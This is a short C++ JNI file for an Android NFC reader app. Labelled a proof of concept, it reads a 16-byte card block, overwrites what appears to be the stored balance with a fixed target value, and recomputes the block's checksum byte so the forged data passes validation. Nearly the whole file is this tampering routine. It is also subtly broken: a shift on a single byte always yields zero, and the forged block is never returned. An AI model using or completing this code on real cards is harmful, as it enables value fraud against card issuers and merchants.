#include <jni.h>
#include <string>
typedef unsigned char uchar;

const float target = 20;  // target < 5242.88

extern "C"
JNIEXPORT jfloat JNICALL
Java_sample_nfc_reader_MainActivity_decodeNfc(JNIEnv *env, jobject thiz, jbyteArray block) {
    uchar Lw = int(target * 100) & 0xff;
    uchar Hw = int(target) & 0xff;

    uchar result[16];
    env -> GetByteArrayRegion(block, 0, 16, (jbyte*) result);

    uchar G4p;
    uchar G1 = result[0], G2 = result[1];

    uchar G3_list[] = { 0x00, 0x64, 0xC8, 0x2C, 0x90, 0xF4, 0x58, 0xBC, 0x20, 0x84 };
    uchar B1 = result[7], G3 = result[14], G4 = result[15];

    int index = -1;
    for (int i = 0; i < 10; i++) {
        if (G3_list[i] == G3) {
            index = i;
            break;
        }
    }
    G4p = G4 - B1;
    while (index > 0) {
        G4p += 0xA0, G1 += 0x04;
        index--;
    }
    G2 += G1 >> 8;

    uchar magic = 512 + G4p - G1 - G2;
    G4p = Lw + Hw + magic;

    result[0] = Lw, result[1] = Hw;
    result[7] = 0, result[14] = 0;
    result[15] = G4p;

    // PoC
    jbyteArray modified = env -> NewByteArray(16);
    env -> SetByteArrayRegion(modified, 0, 16, (jbyte*) result);

    return float((G2 << 8) + G1) / 100.0F;
}